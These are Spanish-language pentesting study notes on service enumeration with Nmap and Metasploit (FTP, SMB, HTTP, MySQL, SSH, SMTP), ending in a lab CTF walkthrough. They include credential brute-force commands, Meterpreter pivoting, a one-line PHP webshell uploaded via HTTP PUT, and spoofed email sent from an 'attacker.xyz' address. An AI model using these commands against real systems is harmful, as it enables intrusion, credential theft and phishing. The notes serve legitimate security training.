-----
La **enumeración** es una de las fases más importantes dentro del hacking ético y el pentesting. Consiste en **obtener información detallada y precisa** sobre los servicios, sistemas y recursos que se han descubierto previamente durante la fase de reconocimiento.
### ¿En qué consiste la enumeración de servicios?

La enumeración de servicios se centra en **analizar los servicios que están corriendo en una máquina** con el objetivo de conocer **cómo están configurados y qué información exponen**.

Durante esta fase buscamos, entre otras cosas:

- **Versiones exactas de los servicios**  
    (software, frameworks, servidores web, motores de bases de datos, etc.)
- **Configuraciones incorrectas o inseguras**  
    (servicios mal protegidos, accesos anónimos, permisos excesivos)
- **Archivos y recursos expuestos**  
    (backups, configuraciones, directorios, archivos sensibles)
- **Vulnerabilidades conocidas**  
    asociadas a versiones concretas del software
- **Usuarios existentes en el sistema**
- **Privilegios y roles de esos usuarios**
- **Servicios internos o no documentados**
- **Mecanismos de autenticación y autorización**
- **Información del sistema operativo y arquitectura**

---
## ESCANEO DE PUERTOS Y ENUMERACIÓN CON NMAP Y METASPLOIT

### comandos de metasploit con nmap:

- **iniciar la base de datos postgresql:**
    `service postgresql start`
    👉 Necesaria para que Metasploit pueda **almacenar hosts, servicios, credenciales y vulnerabilidades**.
    
- **iniciamos metasploit:**
    `msfconsole`
    - **nos conectamos / comprobamos la BD:**
        `db_status`
        ✔️ Debe mostrar conexión activa con la base de datos.
        
- **creamos un workspace, para que toda la info quede almacenada:**
    `workspace -a nombre`
    👉 Permite **organizar la información por objetivo o auditoría**.
    
- **para salir del workspace actual y movernos a otro workspace:**
    `workspace workspace nombre`
    👉 `workspace` lista los existentes y `workspace nombre` cambia al deseado.
    
- **para ver las sesiones activas:**
	`sesions`
    
- **usamos db_nmap para escanear y guardar resultados automáticamente:**
    `db_nmap -Pn -vvv -sS -sV -O IP`
    👉 Realiza escaneo SYN, detecta versiones y sistema operativo, y **guarda todo en Metasploit**.
    - **también podemos importar archivos XML de nmap:**
        `db_import /ruta/archivo.xml`
        👉 Útil si el escaneo se ha hecho fuera de Metasploit.
        
- **podemos ver la información de los hosts detectados con:**
    `hosts`
    👉 Muestra IPs, SO detectado y estado.
- **podemos ver los servicios de los hosts con:**
    `services`
    👉 Lista puertos, protocolos, servicios y versiones detectadas.
- **podemos ver las vulnerabilidades encontradas con:**
    `vulns`
    👉 Muestra vulnerabilidades asociadas a servicios, versiones o módulos ejecutados.
    
- **ver credenciales recopiladas:**
    `creds`
    👉 Usuarios, contraseñas y hashes encontrados.
    
- **buscar exploits o módulos relacionados con los servicios detectados:**
    `search nombre_servicio`
    
	- **podemos usarlos con:**
		`use ruta o el numero identificador`

	- **podemos ver las opciones con:**
		`show options`
		
		- **seteamos las opciones:**
			`set RHOST: ip`
			`set RPORT: puerto`
			- **podemos setear variables globales:**
				`setg RHOSTS ip`
			
		- **ejecutamos:**
			`run`
			
		- **si es un exploit:**
			`exploit`
			
## METERPRETER:
- **podemos obtener una shell del sistema con:**
    `shell`
    👉 Abre una shell básica del sistema comprometido.
    
    - **mejorar la shell a bash interactiva (Linux):**
        `/bin/bash -i`
        👉 Permite usar historial, autocompletado y señales correctamente.
        
- **podemos ver la configuración de red del equipo comprometido con:**
    `ifconfig` o `ip addr`
    👉 Nos permite identificar **interfaces, IPs internas y subredes**.
    
- **para añadir rutas a subredes internas (pivoting) usamos:**
    `run autoroute -s 192.168.1.0/24`
    👉 Añade una ruta para poder **acceder y escanear redes internas** desde Metasploit.
    
    - **ver las rutas añadidas:**
        `run autoroute -p`
        
- **una vez añadida la ruta, podemos escanear la red interna con:**
    `db_nmap 192.168.1.0/24`
    👉 Escaneo de la red interna **a través del equipo comprometido**.

----
## **BANNER GRABBING**

El **banner grabbing** es una técnica de **reconocimiento** que consiste en **obtener información de un servicio** conectándose a él y leyendo el _banner_ que devuelve.
Este banner suele revelar:
- Servicio en ejecución (SSH, FTP, HTTP, etc.)
- Versión del software
- Sistema operativo
- Información útil para **buscar vulnerabilidades conocidas (CVEs)**

👉 No explota el sistema, **solo recopila información**.
### ¿Para qué se utiliza?

- Identificar servicios activos
- Detectar versiones vulnerables
- Elegir el exploit adecuado
- Reducir intentos fallidos (menos ruido, más precisión)
### Técnicas y comandos comunes

#### **Banner grabbing con Nmap**

Obtiene versión y banner de los servicios detectados:
`nmap -sV --script banner <IP>`
#### **Banner grabbing con Netcat**

Conexión manual a un puerto para leer el banner:
`nc <IP> <PUERTO>`

Ejemplo:
`nc 10.10.10.10 21`

Útil para servicios como **FTP, SMTP, HTTP**.
#### **Banner grabbing con SSH**

Al intentar conectarse, el servidor devuelve información de versión:
`ssh user@<IP>`

Ejemplo de banner:
`SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10`

----
## FTP ENUMERATION:

### ¿qué es ftp?

FTP (**File Transfer Protocol**) es un protocolo usado para **transferir archivos** entre cliente y servidor.  
Funciona sobre **TCP** y su **puerto por defecto es el 21**.
### comandos desde MSF:
- **buscar módulos auxiliares relacionados con FTP:**
    `search type:auxiliary name:ftp`
    👉 Lista módulos de enumeración y autenticación para servicios FTP.

- **enumerar versión del servicio FTP:**    
    `use auxiliary/scanner/ftp/ftp_version set RHOSTS IP run`
    👉 Obtiene el **banner y la versión del servidor FTP**.
    
    - **buscar exploits según la versión encontrada:**
        `search nombre_ftp versión`
        👉 Permite identificar **vulnerabilidades conocidas** para esa versión.

- **scanner de autenticación FTP (fuerza bruta):**
    `use auxiliary/scanner/ftp/ftp_login set RHOSTS IP set USER_FILE users.txt set PASS_FILE passwords.txt run`
    👉 Intenta descubrir **usuarios y contraseñas válidas**.
    
    - **listas típicas de Metasploit:**
        `/usr/share/metasploit-framework/data/wordlists`
        
- **detectar acceso anónimo:**
    `use auxiliary/scanner/ftp/anonymous set RHOSTS IP run`
    👉 Comprueba si el servidor permite conexión con el usuario **anonymous**  
    (muy común en servidores mal configurados).
### conexión manual al FTP:

- **conectarse al servidor FTP:**
    `ftp IP`
    👉 Solicita **usuario y contraseña** (o `anonymous`).
    
- **listar archivos y directorios:**
    `ls`
    
- **descargar un archivo:**
    `get nombre_archivo`
    
- **salir de la sesión FTP:**
    `exit`

----
## SMB ENUMERATION:

SMB (**Server Message Block**) es un protocolo usado para **compartir archivos, impresoras y recursos** en red.  
Funciona principalmente sobre **TCP puerto 445** y está muy asociado a **Windows**.  
En **Linux** se implementa mediante **SAMBA**.  
En versiones antiguas también usa el **puerto 139/tcp (NetBIOS)**.
### comandos:

- **buscar módulos relacionados con SMB en Metasploit:**
    `search type:auxiliary name:smb`
    👉 Muestra módulos de enumeración, autenticación y escaneo SMB.
    
- **para obtener la versión del servicio SMB:**
    `use auxiliary/scanner/smb/smb_version set RHOSTS IP run`
    👉 Permite identificar **SO, versión de Windows y versión de SMB**.
    
    - **buscar exploits según la versión encontrada:**
        `search nombre_version_smb`
        👉 Útil para detectar vulnerabilidades como **MS17-010 (EternalBlue)**.
    
- **para enumerar usuarios SMB:**
    `use auxiliary/scanner/smb/smb_enumusers set RHOSTS IP run`
    👉 Intenta listar **usuarios existentes en el sistema**.

- **para enumerar recursos compartidos (shares):**    
    `use auxiliary/scanner/smb/smb_enumshares set RHOSTS IP set ShowFiles true run`
    👉 Muestra **carpetas compartidas** y, si es posible, los archivos dentro.
    
- **para realizar fuerza bruta contra SMB:**
    `use auxiliary/scanner/smb/smb_login set RHOSTS IP set USER_FILE users.txt set PASS_FILE passwords.txt run`
    👉 Intenta obtener **credenciales válidas**.
    
    - **ruta típica a diccionarios en Metasploit:**
        `/usr/share/metasploit-framework/data/wordlists`
        
### acceso a smb (fuera de metasploit):

- **listar recursos compartidos:**
    `smbclient -L //IP -U admin`
    👉 Muestra los **shares disponibles**.
    
- **acceder a un recurso compartido concreto:**
    `smbclient //IP/carpeta -U admin`
    
- para ver permisos:
		--shares con nsx
### comandos dentro de smbclient:

- **listar archivos:**
    `ls`
    
- **descargar un archivo:**
    `get nombre_archivo`
    
- **moverse entre directorios:**
    `cd carpeta`
    
-----
## WEBSERVER ENUMERATION:

Un **servidor web** es el software encargado de **recibir peticiones HTTP/HTTPS del cliente (navegador)** y **responder con contenido web** (HTML, CSS, JS, imágenes, APIs, etc.).

Ejemplos comunes:
- **Apache**    
- **Nginx**
- **Microsoft IIS**

El webserver actúa como **intermediario entre el cliente y el servidor**, gestionando:
- peticiones HTTP
- rutas y recursos
- autenticación
- errores
- cabeceras
- comunicación con aplicaciones backend

Una mala configuración del webserver puede exponer **archivos sensibles, rutas ocultas o vulnerabilidades críticas**.
### comandos:

- **buscar módulos auxiliares HTTP en Metasploit:**
    `search type:auxiliary name:http`
    👉 Muestra módulos de enumeración, fuerza bruta y análisis web.

- **enumerar versión del servidor web:**    
    `use auxiliary/scanner/http/http_version`
    `set RHOSTS IP | set RPORT 80 | run`
    👉 Obtiene **Apache, Nginx, IIS y versión** si el banner está expuesto.

- **obtener cabeceras HTTP (como `curl -I`):**    
    `use auxiliary/scanner/http/http_header set RHOSTS IP run`
    👉 Revela información como **Server, cookies, redirects, frameworks**.
    
- **leer el contenido de robots.txt:**
    `use auxiliary/scanner/http/robots_txt set RHOSTS IP run`
    👉 Muestra rutas **intencionadamente ocultas**.
    
- **comprobar directory listing :**
    `search dir_listing`
    👉 comprueba si hay direcrtory listing en **directorios**.
    
- **comprobar directory listing manualmente:**
    `curl http://IP/ruta_interesante/`
    👉 Si no hay `index`, puede listar **archivos y directorios**.

- **fuerza bruta de directorios:**
    `use auxiliary/scanner/http/dir_scanner` 
    `set RHOSTS IP | set DICTIONARY rutas.txt | run`
    👉 Descubre **rutas ocultas** mediante diccionario.

- **fuerza bruta de archivos:**    
    `use auxiliary/scanner/http/files_dir set RHOSTS IP set DICTIONARY archivos.txt run`
    👉 Busca **archivos sensibles** (`.bak`, `.txt`, `.zip`, `.php`).
    
- **fuerza bruta de login HTTP:**
    `use auxiliary/scanner/http/http_login set RHOSTS IP set AUTH_URI /ruta_login/ set USER_FILE namelist.txt set PASS_FILE unix_passwords.txt run`
    👉 Ataque de **fuerza bruta sobre formularios web**.
    
    - **opción importante a desactivar si falla:**    
        `unset STOP_ON_SUCCESS`

- **enumerar usuarios mediante directorios Apache (~user):**    
    `use auxiliary/scanner/http/apache_userdir_enum set RHOSTS IP run`
    👉 Detecta usuarios válidos mediante `/~usuario`.
    
- **comprobar si el servidor permite subir archivos vía HTTP PUT:**
    `use auxiliary/scanner/http/http_put set RHOSTS IP set RPORT 80 set PATH /ruta/ set FILE test.txt set DATA prueba run`
    👉 Intenta **subir un archivo directamente al servidor web** usando el método PUT.

- **subir un archivo malicioso (webshell) con PUT:**
    
    `set FILE shell.php set DATA "<?php system($_GET['cmd']); ?>" run`
    👉 Si el servidor lo permite y la ruta es accesible, se puede lograr **RCE** accediendo al archivo desde el navegador.

- **usar HTTP DELETE para borrar archivos (si está permitido):**    
    `use auxiliary/scanner/http/http_put set RHOSTS IP set PATH /ruta/archivo.txt set METHOD DELETE run`
    👉 Permite **eliminar archivos del servidor web** si el método DELETE está mal configurado.
    
### 🧠 ¿Cuándo puede usarse HTTP PUT / DELETE?

- Cuando el servidor:
    - tiene **WebDAV habilitado**
    - permite métodos HTTP inseguros
    - está **mal configurado**
- Muy común en:
    - servidores de pruebas
    - entornos legacy
    - IIS antiguos
    - Apache mal configurado

---
## MYSQL ENUMERATION:

**MySQL** es un **sistema gestor de bases de datos relacional** muy utilizado en aplicaciones web, especialmente en **WordPress**, junto con PHP.  
Escucha normalmente en el **puerto 3306/TCP** y almacena información crítica como **usuarios, contraseñas, configuraciones y datos de la aplicación**.
### comandos:

- **buscar módulos relacionados con MySQL en Metasploit:**
    `search type:auxiliary name:mysql`
    👉 Muestra módulos de escaneo, autenticación y enumeración MySQL.
    
- **enumerar la versión del servicio MySQL:**
    `use auxiliary/scanner/mysql/mysql_version set RHOSTS IP run`
    👉 Obtiene la **versión exacta del servidor MySQL**.
    
    - **buscar exploits según la versión:**
        `search mysql versión`
        👉 Permite detectar **vulnerabilidades conocidas**.
        
- **fuerza bruta de credenciales MySQL:**
    `use auxiliary/scanner/mysql/mysql_login set RHOSTS IP set USER_FILE users.txt set PASS_FILE passwords.txt run`
    👉 Intenta descubrir **usuarios y contraseñas válidas**.
    
    - **usuario típico a probar:**
        `root`
        👉 `root` suele tener **máximos privilegios** por defecto.
        
- **enumeración completa con credenciales válidas:**
    `use auxiliary/admin/mysql/mysql_enum set RHOSTS IP set USERNAME usuario set PASSWORD contraseña run`
    👉 Recopila **usuarios, bases de datos, permisos y configuración**.
    
- **ejecutar consultas SQL con credenciales válidas:**
    `use auxiliary/admin/mysql/mysql_sql set RHOSTS IP set USERNAME usuario set PASSWORD contraseña set SQL "SELECT user, host FROM mysql.user;" run`
    👉 Permite ejecutar **comandos SQL arbitrarios**.
    
- **volcar información del esquema (databases, tables):**
    `use auxiliary/scanner/mysql/mysql_schemadump set RHOSTS IP set USERNAME usuario set PASSWORD contraseña run`
    👉 Extrae **estructura de bases de datos y tablas**.
### conexión manual a MySQL:

- **conectarse al servidor MySQL:**
    `mysql -h IP -u root -p`
    👉 Solicita la contraseña del usuario.
### comandos SQL básicos:

- **mostrar bases de datos:**
    `SHOW DATABASES;`
    
- **usar una base de datos:**
    `USE users;`
    
- **mostrar tablas:**
    `SHOW TABLES;`
    
- **extraer usuarios y contraseñas:**
    `SELECT username, password FROM users;`

----
## SSH ENUMERATION:

**SSH (Secure Shell)** es un protocolo utilizado para el **acceso remoto seguro** a servidores y sistemas.  
Funciona sobre **TCP puerto 22** y es una **mejora de Telnet**, ya que **todo el tráfico va cifrado** (credenciales, comandos y datos).

SSH permite:
- administración remota
- ejecución de comandos
- transferencia segura de archivos
- túneles y port forwarding
### comandos:

- **buscar módulos relacionados con SSH en Metasploit:**
    `search type:auxiliary name:ssh`
    👉 Muestra módulos de enumeración y autenticación SSH.
    
- **enumerar versión del servicio SSH:**
    `use auxiliary/scanner/ssh/ssh_version set RHOSTS IP run`
    👉 Obtiene la **versión del servidor SSH** y el banner.
    
    - **buscar exploits según la versión:**
        `search ssh versión`
        👉 Permite comprobar si la versión tiene **vulnerabilidades conocidas**.
    
- **fuerza bruta de usuarios y contraseñas:**
    `use auxiliary/scanner/ssh/ssh_login set RHOSTS IP set USER_FILE users.txt set PASS_FILE passwords.txt run`
    👉 Intenta obtener **credenciales válidas** por fuerza bruta.
    
    - **si el servidor usa solo autenticación por clave pública:**
        `use auxiliary/scanner/ssh/ssh_login_pubkey`
        👉 Prueba **claves privadas SSH** en lugar de contraseñas.
        
    - **si obtenemos acceso, Metasploit crea una sesión:**
        `sessions sessions -i ID /bin/bash -i`
        👉 Acceso interactivo al sistema remoto.
        
- **enumerar usuarios válidos por SSH:**
    `use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS IP run`
    👉 Detecta **usuarios existentes** según las respuestas del servidor.
    
    - **usuarios válidos pueden probarse después con fuerza bruta**.
### conexión manual por SSH:

- **acceso remoto directo:**
    `ssh usuario@IP`
    👉 Solicita la contraseña o usa clave privada si está configurado.

---
## SMTP ENUMERATION:

**SMTP (Simple Mail Transfer Protocol)** es el protocolo utilizado para **enviar correos electrónicos**.  
Funciona normalmente sobre **TCP puerto 25**, aunque también es común encontrarlo en:

- **465/TCP** (SMTPS)
- **587/TCP** (SMTP con autenticación)

Durante la enumeración SMTP buscamos principalmente **usuarios válidos**, **información filtrada en respuestas** y **datos útiles para otros ataques** (SSH, fuerza bruta, phishing, password spraying).
### ¿por qué es interesante SMTP?

SMTP puede revelar:
- **usuarios existentes** en el sistema
- **direcciones de correo válidas**
- **mensajes de error informativos**
- **pistas para construir contraseñas**
- información interna de la organización

Los usuarios descubiertos pueden reutilizarse en:
- SSH
- FTP
- SMB
- paneles web
### comandos:

- **buscar módulos relacionados con SMTP en Metasploit:**
    `search type:auxiliary name:smtp`
    👉 Muestra módulos de enumeración y análisis SMTP.

- **enumerar versión del servicio SMTP:**
    
    `use auxiliary/scanner/smtp/smtp_version set RHOSTS IP run`    
    👉 Obtiene el **banner y versión del servidor SMTP**.
    
- **enumerar usuarios SMTP:**
    `use auxiliary/scanner/smtp/smtp_enum set RHOSTS IP set USER_FILE users.txt run`
    👉 Comprueba qué **usuarios existen** mediante comandos SMTP (`VRFY`, `EXPN`, `RCPT TO`).
- **conexion mediante netcat:**
	`nc ip 25`
	👉 Puede dar informacion relevante en el banner de bienvenida (servidor).
	
- **verificación manual de si un usuario existe:**
	``VRFY admin@openmailbox.xyz``
	
- **envio de mensaje mail:**
	````
	telnet demo.ine.local 25
	HELO attacker.xyz
	mail from: admin@attacker.xyz
	rcpt to:root@openmailbox.xyz
	data
	Subject: Hi Root
	Hello,
	This is a fake mail sent using telnet command.
	From,
	Admin
	.
	````
	**comando:**
	 `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no`
----
## 🏴‍☠️ CTF

### 🔹 Flag 1 – Enumeración de shares SMB anónimos

`while read -r share; do   echo "[*] Testing share: $share"   smbclient "//target.ine.local/$share" -N \     --option='client min protocol=SMB2' \     -c "ls" 2>/dev/null | grep -v "NT_STATUS" && \     echo "[+] ACCESSIBLE SHARE FOUND: $share" done < /root/Desktop/wordlists/shares.txt`
### 🔹 Flag 2 – Enumeración y fuerza bruta SMB con Metasploit

1. Enumerar usuarios:
    `smb_enumusers`
2. Crear un diccionario con los usuarios obtenidos.
3. Ataque de fuerza bruta:
    `smb_login`
4. Credenciales obtenidas:
    `josh : purple`
### 🔹 Flag 3 – Fuerza bruta FTP con Hydra

`hydra -L /root/usrs.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554`
### 🔹 Flag 4 – Acceso por SSH

`ssh josh@target.ine.local`
👉 La flag aparece directamente en el **aviso/banner de login** (SSH hablando más de la cuenta, como suele pasar).